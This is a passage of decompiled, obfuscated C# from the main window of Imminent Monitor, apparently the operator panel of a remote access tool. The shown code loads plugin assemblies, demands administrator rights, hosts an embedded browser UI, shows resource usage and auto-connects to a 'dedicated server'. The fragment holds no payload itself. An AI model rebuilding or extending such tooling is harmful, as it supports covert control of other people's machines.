      this.chromiumWebBrowser_0.FrameLoadEnd -= eventHandler;
    this.chromiumWebBrowser_0 = chromiumWebBrowser_1;
    if (this.chromiumWebBrowser_0 == null)
      return;
    this.chromiumWebBrowser_0.FrameLoadEnd += eventHandler;
  }

  public virtual GClass35 vmethod_60() => this.gclass35_0;

  [MethodImpl(MethodImplOptions.Synchronized)]
  public virtual void vmethod_61(GClass35 gclass35_1)
  {
    GClass35.GDelegate21 gdelegate21_1 = new GClass35.GDelegate21(this.method_5);
    if (this.gclass35_0 != null)
      this.gclass35_0.method_1(gdelegate21_1);
    this.gclass35_0 = gclass35_1;
    if (this.gclass35_0 == null)
      return;
    this.gclass35_0.method_0(gdelegate21_1);
  }

  private void method_1() => Class97.gclass21_0 = new GClass21();

  public Assembly method_2(object object_0, ResolveEventArgs resolveEventArgs_0)
  {
    Assembly assembly;
    try
    {
      if (resolveEventArgs_0.Name.StartsWith("CefSharp"))
      {
        string path = Path.Combine(AppDomain.CurrentDomain.SetupInformation.ApplicationBase, "bin\\cef", resolveEventArgs_0.Name.Split(',')[0] + ".dll");
        assembly = File.Exists(path) ? Assembly.LoadFile(path) : (Assembly) null;
        goto label_22;
      }
      else if (resolveEventArgs_0.Name.ToLower().Contains("gif"))
      {
        assembly = Assembly.Load(Class145.smethod_33());
        goto label_22;
      }
      else if (resolveEventArgs_0.Name.Contains("ServerPlugin"))
      {
        assembly = Assembly.Load(File.ReadAllBytes(Application.StartupPath + "\\bin\\ServerPlugin.dll"));
        goto label_22;
      }
      else if (resolveEventArgs_0.Name.Contains("Svg"))
      {
        assembly = Assembly.Load(File.ReadAllBytes(Application.StartupPath + "\\bin\\Svg.dll"));
        goto label_22;
      }
      else if (resolveEventArgs_0.Name.Contains("LZLoader"))
      {
        assembly = Assembly.Load(File.ReadAllBytes(Application.StartupPath + "\\bin\\LZLoader.dll"));
        goto label_22;
      }
      else if (resolveEventArgs_0.Name.ToLower().Contains("color"))
      {
        assembly = Assembly.Load(File.ReadAllBytes(Application.StartupPath + "\\bin\\FastColoredTextBox.dll"));
        goto label_22;
      }
      else if (resolveEventArgs_0.Name.ToLower().Contains("newton"))
      {
        assembly = Assembly.Load(File.ReadAllBytes(Application.StartupPath + "\\bin\\Newtonsoft.Json.dll"));
        goto label_22;
      }
      else if (resolveEventArgs_0.Name.ToLower().Contains("mono"))
      {
        assembly = Assembly.Load(File.ReadAllBytes(Application.StartupPath + "\\bin\\Mono.Nat.dll"));
        goto label_22;
      }
      else if (resolveEventArgs_0.Name.ToLower().Contains("slimdx"))
      {
        assembly = Assembly.Load(File.ReadAllBytes(Application.StartupPath + "\\bin\\SlimDX.dll"));
        goto label_22;
      }
      else if (resolveEventArgs_0.Name.ToLower().Contains("maxmind"))
      {
        assembly = Assembly.Load(File.ReadAllBytes(Application.StartupPath + "\\bin\\MaxMind.Db.dll"));
        goto label_22;
      }
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      Class97.smethod_0().method_2(new Exception("Failed to load required assemblies, please re-install Imminent Monitor"), (string) null);
      assembly = (Assembly) null;
      ProjectData.ClearProjectError();
      goto label_22;
    }
    return (Assembly) null;
label_22:
    return assembly;
  }

  [MethodImpl(MethodImplOptions.NoOptimization)]
  private void method_3()
  {
    if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
      return;
    int num = (int) MessageBox.Show("Please run Imminent Monitor as an administrator!", "Error", MessageBoxButtons.OK, MessageBoxIcon.Hand);
    ProjectData.EndApp();
  }

  private void method_4()
  {
    object[] object_3 = new object[1]{ (object) this };
    Class86.smethod_0().method_68(Class86.smethod_1(), "kT,hMPa.Q$", object_3);
  }

  private void method_5()
  {
    object[] object_3 = new object[1]{ (object) this };
    Class86.smethod_0().method_68(Class86.smethod_1(), ";[S\\OPa.Q$", object_3);
  }

  [MethodImpl(MethodImplOptions.NoOptimization)]
  private void method_6()
  {
    Class97.smethod_28((Form) this);
    string path = string.Format("{0}\\bin\\cef\\site\\base\\html\\imminent\\index.html", (object) Application.StartupPath);
    if (!File.Exists(path))
    {
      int num = (int) MessageBox.Show("Error The html file doesn't exists : " + path);
      ProjectData.EndApp();
    }
    this.vmethod_59(new ChromiumWebBrowser(path));
    this.Controls.Add((Control) this.vmethod_58());
    ((Control) this.vmethod_58()).Location = new Point(-1920, -1080);
    ((Control) this.vmethod_58()).Size = new Size(1210, 749);
    ((Control) this.vmethod_58()).Dock = DockStyle.None;
    ((Control) this.vmethod_58()).AllowDrop = false;
    this.vmethod_58().BrowserSettings = new BrowserSettings()
    {
      FileAccessFromFileUrls = (CefState) 1,
      UniversalAccessFromFileUrls = (CefState) 1,
      WebSecurity = (CefState) 1
    };
    this.vmethod_58().RegisterJsObject("mainForm", (object) new MainCefHandler(this), (BindingOptions) null);
    new Thread(new ThreadStart(this.method_17)).Start();
  }

  private void method_7(object sender, FrameLoadEndEventArgs e) => new Thread(new ThreadStart(this.method_12)).Start();

  private void FormMain_Load(object sender, EventArgs e)
  {
    this.Text = this.Text.Replace("{0}", Class97.gclass1_0.string_3);
    this.method_6();
    this.vmethod_0().method_2();
  }

  private void FormMain_FormClosing(object sender, FormClosingEventArgs e)
  {
    if (Class97.generalSettings_0.CloseTray)
    {
      e.Cancel = true;
      this.Hide();
    }
    else
      this.method_15();
  }

  private void FormMain_Resize(object sender, EventArgs e) => this.method_16();

  private void method_8(object sender, EventArgs e)
  {
    this.Show();
    this.WindowState = FormWindowState.Normal;
  }

  private void method_9(object sender, EventArgs e) => this.method_15();

  private void method_10(object sender, LinkLabelLinkClickedEventArgs e) => this.method_11();

  private void method_11() => Process.Start("https://github.com/ShockwaveHF/Imminent-Monitor-Plugin-Base");

  protected override void WndProc(ref Message m)
  {
    base.WndProc(ref m);
    if (m.Msg != Class97.int_0 || (int) m.WParam != Class97.int_3)
      return;
    WebBrowserExtensions.ShowDevTools((IWebBrowser) this.vmethod_58());
  }

  private void method_12()
  {
    if (this.bool_0)
      return;
    Thread.Sleep(300);
    this.Invoke((Delegate) (() => this.method_13()));
  }

  private void method_13()
  {
    ((Control) this.vmethod_58()).Dock = DockStyle.Fill;
    this.vmethod_48().Visible = false;
    Class108.smethod_1();
    Class148.smethod_2();
    Class97.smethod_15(this.vmethod_34());
    this.method_14();
    this.bool_0 = true;
  }

  private void method_14()
  {
    DediSettings dediSettings = GClass37.smethod_1();
    if (dediSettings == null || !dediSettings.ConnectAutomatically)
      return;
    Class97.smethod_27(dediSettings.IP, dediSettings.Port, Class97.smethod_26(dediSettings.Password));
  }

  public void method_15()
  {
    try
    {
      foreach (Process process in Process.GetProcessesByName("Imminent.Cef"))
        process.Kill();
      Process.GetCurrentProcess().Kill();
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      Exception exception_0 = ex;
      Class97.smethod_0().method_2(exception_0, (string) null);
      ProjectData.ClearProjectError();
    }
  }

  private void method_16()
  {
    if (Class97.generalSettings_0 == null || !Class97.generalSettings_0.MinTray)
      return;
    switch (this.WindowState)
    {
      case FormWindowState.Normal:
        this.Show();
        break;
      case FormWindowState.Minimized:
        this.Hide();
        break;
    }
  }

  private void method_17()
  {
    try
    {
      PerformanceCounter performanceCounter = new PerformanceCounter("Process", "% Processor Time", Process.GetCurrentProcess().ProcessName, true);
      ulong availablePhysicalMemory = Class132.smethod_0().Info.AvailablePhysicalMemory;
      while (true)
      {
        try
        {
          float a = performanceCounter.NextValue() / (float) Environment.ProcessorCount;
          Decimal d = new Decimal((double) Process.GetCurrentProcess().WorkingSet64 / (double) availablePhysicalMemory * 100.0);
          Class97.smethod_20(this.vmethod_58(), string.Format("updateStatus('{0}%', '{1}%')", (object) Math.Round((double) a), (object) Math.Round(d)));
          Thread.Sleep(1000);
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
  }

  private void method_18()
  {
    if (File.Exists("Imminent Monitor 3.0.exe"))
      File.Delete("Imminent Monitor 3.0.exe");
    if (!File.Exists(Application.StartupPath + "\\Resources\\Imminent Monitor Dedicated Server.exe"))
      return;
    File.Delete(Application.StartupPath + "\\Resources\\Imminent Monitor Dedicated Server.exe");
  }

  private void method_19(object sender, LinkLabelLinkClickedEventArgs e) => Class108.smethod_0();
}
